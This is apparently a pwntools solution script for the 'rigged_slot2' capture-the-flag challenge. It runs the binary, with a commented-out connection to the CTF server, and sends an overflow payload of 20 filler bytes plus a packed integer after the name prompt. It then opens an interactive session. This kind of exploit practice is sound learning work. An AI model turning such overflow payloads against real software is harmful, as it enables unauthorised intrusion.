#!/usr/bin/python3

from pwn import *

exe = ELF('./rigged_slot2', checksec=False)

p = process(exe.path)
# p = remote('riggedslot2.ctf.intigriti.io', 1337)
payload = b'a'*20 + p64(1337421)
input()
p.sendlineafter(b'Enter your name:\n', payload)

p.interactive()